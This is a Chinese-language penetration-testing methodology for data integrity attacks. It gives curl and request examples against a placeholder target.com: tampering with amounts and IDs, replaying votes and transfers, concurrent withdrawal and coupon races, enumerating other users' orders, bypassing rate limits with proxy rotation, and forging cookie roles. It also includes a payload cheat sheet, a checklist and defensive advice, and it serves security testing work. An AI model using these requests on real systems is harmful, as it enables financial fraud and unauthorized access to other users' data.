# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的数据完整性攻击（Data Integrity Attack）测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用数据完整性验证缺失的漏洞，包括数据篡改、重放攻击、竞争条件、逻辑绕过等技术。

## 1.2 适用范围

本文档适用于以下场景：
- Web 应用中的数据传输和存储
- API 接口的数据验证
- 数据库中的数据完整性
- 缓存数据的完整性
- 会话和认证数据
- 业务逻辑数据流

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行 API 安全测试的顾问
- 负责数据安全的开发人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：数据完整性攻击

### 2.1 技术介绍

数据完整性攻击（Data Integrity Attack）是针对数据在传输、存储、处理过程中完整性保护不足的攻击。攻击者通过篡改、重放、删除数据，实现未授权访问、业务逻辑绕过或数据泄露。

**攻击原理：**
- **数据篡改：** 修改传输或存储中的数据
- **重放攻击：** 重复发送有效请求达到恶意目的
- **竞争条件：** 利用并发处理缺陷绕过检查
- **逻辑绕过：** 利用业务逻辑缺陷绕过验证
- **缓存投毒：** 污染缓存数据影响后续请求
- **会话劫持：** 篡改会话数据获取未授权访问

**本质：** 系统未能正确验证数据的完整性、新鲜性和来源可信性。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **电商购物** | 修改订单金额、数量 | 前端参数未在服务端验证 |
| **金融交易** | 转账金额、收款人篡改 | 交易数据无签名保护 |
| **用户认证** | Cookie/Token 篡改 | 会话标识无完整性保护 |
| **权限控制** | 修改用户角色参数 | 权限参数可被篡改 |
| **API 调用** | 修改 API 请求参数 | 请求无签名或签名验证缺陷 |
| **数据导出** | 修改导出条件 | 导出参数可被注入 |
| **投票系统** | 重复投票 | 无防重放机制 |
| **优惠券/积分** | 重复使用、篡改面值 | 使用记录无完整性保护 |
| **库存管理** | 修改库存数量 | 库存变更无审计 |
| **日志审计** | 篡改日志记录 | 日志无完整性保护 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**数据流分析：**

1. **识别数据输入点**
   ```bash
   # 使用代理工具捕获所有请求
   # Burp Suite: Proxy -> HTTP History
   
   # 识别关键参数
   # - 金额、数量、价格
   # - 用户 ID、角色、权限
   # - 订单号、交易号
   # - Token、Session ID
   ```

2. **测试参数篡改**
   ```bash
   # 修改金额参数
   original: {"amount": 100.00}
   modified: {"amount": 0.01}
   
   # 修改数量参数
   original: {"quantity": 1}
   modified: {"quantity": -1}
   original: {"quantity": 9999}
   
   # 修改用户 ID
   original: {"user_id": 123}
   modified: {"user_id": 1}
   ```

3. **测试重放攻击**
   ```bash
   # 捕获有效请求
   # 重复发送相同请求
   for i in {1..10}; do
     curl -X POST https://target.com/api/vote \
       -H "Authorization: Bearer TOKEN" \
       -d '{"candidate": 1}'
   done
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查数据验证逻辑**
   ```python
   # 危险模式：缺少服务端验证
   def update_order(order_id, amount):
       # 直接使用前端传入的金额
       db.execute(f"UPDATE orders SET amount={amount} WHERE id={order_id}")
       
   # 安全模式：从可信源获取金额
   def update_order(order_id, amount):
       # 从数据库获取原始订单信息验证
       order = db.get_order(order_id)
       if order.price * order.quantity != amount:
           raise Exception("Amount mismatch")
   ```

2. **检查签名验证**
   ```python
   # 危险模式：无签名
   data = request.json
   process(data)
   
   # 安全模式：验证签名
   data = request.json
   signature = request.headers['X-Signature']
   if not verify_signature(data, signature):
       raise Exception("Invalid signature")
   ```

3. **检查防重放机制**
   ```python
   # 危险模式：无 nonce/timestamp 检查
   def process_payment(data):
       db.execute(...)
   
   # 安全模式：检查 nonce
   def process_payment(data):
       if nonce_exists(data['nonce']):
           raise Exception("Replay detected")
       if is_expired(data['timestamp']):
           raise Exception("Expired request")
   ```

### 2.4 漏洞利用方法

#### 2.4.1 数据篡改攻击

**订单金额篡改：**
```bash
# 原始请求
POST /api/order/create
{
  "product_id": 123,
  "quantity": 1,
  "price": 999.00,
  "total": 999.00
}

# 篡改后的请求
POST /api/order/create
{
  "product_id": 123,
  "quantity": 1,
  "price": 0.01,
  "total": 0.01
}
```

**负数攻击：**
```bash
# 转账场景
POST /api/transfer
{
  "from_account": "victim",
  "to_account": "attacker",
  "amount": -1000  # 负数可能导致反向转账
}

# 库存场景
POST /api/inventory/update
{
  "product_id": 123,
  "change": -9999  # 负数减少可能导致库存溢出
}
```

**类型混淆攻击：**
```bash
# 数组绕过
POST /api/checkout
{
  "coupon": "DISCOUNT10"      # 单个优惠券
}

# 改为数组（如果后端处理不当）
POST /api/checkout
{
  "coupon": ["DISCOUNT10", "DISCOUNT10", "DISCOUNT10"]  # 多次应用
}

# 布尔类型绕过
POST /api/admin/settings
{
  "maintenance_mode": "false"  # 字符串可能被解析为 true
}
```

#### 2.4.2 重放攻击

**投票重放：**
```bash
# 捕获有效投票请求
POST /api/vote
{
  "candidate_id": 1,
  "nonce": "abc123",
  "timestamp": 1234567890,
  "signature": "valid_signature"
}

# 重复发送（如果 nonce 未检查）
for i in {1..100}; do
  curl -X POST https://target.com/api/vote \
    -d '{"candidate_id": 1, ...}'
done
```

**交易重放：**
```bash
# 捕获转账请求
POST /api/transfer
{
  "to": "attacker",
  "amount": 100,
  "nonce": 12345
}

# 如果 nonce 未在服务端递增检查
# 可以重复发送实现多次转账
```

#### 2.4.3 竞争条件攻击

**余额竞争：**
```bash
# 账户余额 100 元
# 并发发起两笔 100 元提现

# 使用 Burp Suite Turbo Intruder
# 或使用并行请求
for i in {1..5}; do
  curl -X POST https://target.com/api/withdraw \
    -d '{"amount": 100}' &
done
wait

# 如果检查和使用非原子操作
# 可能成功多次提现
```

**优惠券竞争：**
```bash
# 并发使用同一优惠券
for i in {1..10}; do
  curl -X POST https://target.com/api/checkout \
    -d '{"coupon": "SAVE50"}' &
done
wait
```

#### 2.4.4 逻辑绕过攻击

**越权访问：**
```bash
# 查看自己订单
GET /api/order/123

# 遍历查看他人订单
for i in {1..1000}; do
  curl https://target.com/api/order/$i
done
```

**状态机绕过：**
```bash
# 正常流程：待支付 -> 已支付 -> 已发货 -> 已完成
# 直接跳转到已完成
POST /api/order/123/status
{
  "status": "completed"  # 跳过支付检查
}
```

#### 2.4.5 信息收集命令

```bash
# 收集 API 响应信息
curl -v https://target.com/api/user/profile

# 检查响应头中的安全控制
curl -I https://target.com/api/data

# 测试 CORS 配置
curl -H "Origin: http://attacker.com" \
  https://target.com/api/data
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过客户端验证

**方法 1：直接 API 调用**
```bash
# 绕过前端验证，直接调用 API
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: application/json" \
  -d '{"amount": -1000}'
```

**方法 2：修改请求参数**
```bash
# 使用 Burp Suite 修改请求
# 或编写脚本发送自定义请求
```

#### 2.5.2 绕过签名验证

**方法 1：利用签名缺陷**
```python
# 如果签名只覆盖部分字段
original: {"amount": 100, "to": "victim", "signature": "..."}
# 修改未签名字段
modified: {"amount": 100, "to": "attacker", "extra": "injected", "signature": "..."}
```

**方法 2：利用弱签名算法**
```bash
# 如果签名使用 MD5 或可预测的密钥
# 可以自行计算签名
signature = md5(data + known_secret)
```

#### 2.5.3 绕过速率限制

**方法 1：IP 轮换**
```bash
# 使用代理池
for ip in $(cat proxy_list.txt); do
  curl -x $ip https://target.com/api/action
done
```

**方法 2：参数变化**
```bash
# 如果速率限制基于参数指纹
# 添加随机参数绕过
curl "https://target.com/api/action?_random=$(date +%s%N)"
```

#### 2.5.4 持久化技术

**Cookie 篡改：**
```bash
# 修改 Cookie 中的权限标识
original: role=user
modified: role=admin

# 修改 Cookie 中的用户 ID
original: user_id=123
modified: user_id=1
```

**本地存储篡改：**
```javascript
// 修改 localStorage
localStorage.setItem('role', 'admin');
localStorage.setItem('permissions', '["read","write","delete"]');
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **金额篡改** | 订单金额 | `{"amount": 0.01}` | 修改为最小金额 |
| **负数攻击** | 转账/库存 | `{"change": -9999}` | 负数导致反向操作 |
| **类型绕过** | 布尔值 | `"false"` as string | 字符串绕过布尔检查 |
| **数组绕过** | 优惠券 | `{"coupon": ["A","B","C"]}` | 数组多次应用 |
| **越权访问** | 资源 ID | `/api/resource/1` | 遍历访问他人资源 |
| **重放攻击** | 投票/交易 | 重复发送相同请求 | 无防重放机制 |

## 3.2 数据完整性检查清单

- [ ] 所有输入数据有服务端验证
- [ ] 敏感数据有签名保护
- [ ] 有防重放机制（nonce/timestamp）
- [ ] 关键操作有幂等性保护
- [ ] 并发操作有锁机制
- [ ] 业务状态机有严格流转控制
- [ ] 权限检查在服务端执行
- [ ] 日志记录完整且防篡改
- [ ] 缓存数据有完整性验证
- [ ] 会话数据有签名保护

## 3.3 常见数据完整性缺陷

| 缺陷类型 | 描述 | 风险等级 |
|---------|------|---------|
| **无服务端验证** | 完全信任前端传入数据 | 严重 |
| **部分验证** | 只验证部分字段 | 高 |
| **弱签名** | 使用 MD5 或可预测密钥 | 高 |
| **无防重放** | 无 nonce/timestamp 检查 | 中 - 高 |
| **竞争条件** | 非原子操作 | 中 - 高 |
| **类型混淆** | 类型转换逻辑缺陷 | 中 |
| **状态机绕过** | 状态流转无检查 | 中 |

## 3.4 防御建议

1. **服务端验证**：所有关键数据必须在服务端验证
2. **数据签名**：对敏感数据使用强签名算法
3. **防重放机制**：实现 nonce 和 timestamp 检查
4. **原子操作**：使用数据库事务保证原子性
5. **并发控制**：使用乐观锁/悲观锁处理并发
6. **状态机保护**：严格定义和检查状态流转
7. **最小权限**：实施最小权限原则
8. **审计日志**：记录所有数据变更操作
9. **速率限制**：实施合理的速率限制
10. **输入验证**：对所有输入进行严格验证
